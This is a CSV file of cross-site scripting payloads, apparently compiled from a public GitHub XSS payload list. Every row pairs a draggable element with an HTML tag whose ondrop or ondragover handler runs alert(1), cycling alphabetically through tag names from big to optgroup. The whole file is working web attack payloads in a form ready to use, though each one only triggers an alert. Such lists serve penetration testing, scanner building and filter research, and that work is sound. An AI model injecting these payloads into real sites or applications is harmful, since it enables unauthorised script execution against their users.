cve,tag,payload,url
,XSS,"<div draggable=""true"" contenteditable>drag me</div><big ondrop=alert(1) contenteditable>drop here</big>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable>drop here</blockquote>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><button ondragover=alert(1) contenteditable>drop here</button>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><button ondrop=alert(1) contenteditable>drop here</button>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><caption ondragover=alert(1) contenteditable>drop here</caption>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><col ondragover=alert(1) contenteditable>drop here</col>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><colgroup ondragover=alert(1) contenteditable>drop here</colgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><command ondragover=alert(1) contenteditable>drop here</command>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><data ondrop=alert(1) contenteditable>drop here</data>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><datalist ondragover=alert(1) contenteditable>drop here</datalist>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><del ondragover=alert(1) contenteditable>drop here</del>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dfn ondragover=alert(1) contenteditable>drop here</dfn>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><div ondragover=alert(1) contenteditable>drop here</div>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><element ondragover=alert(1) contenteditable>drop here</element>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><em ondragover=alert(1) contenteditable>drop here</em>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><figure ondragover=alert(1) contenteditable>drop here</figure>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable>drop here</figure>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><form ondragover=alert(1) contenteditable>drop here</form>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><frame ondragover=alert(1) contenteditable>drop here</frame>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><hgroup ondragover=alert(1) contenteditable>drop here</hgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable>drop here</hr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><html ondragover=alert(1) contenteditable>drop here</html>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><i ondragover=alert(1) contenteditable>drop here</i>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
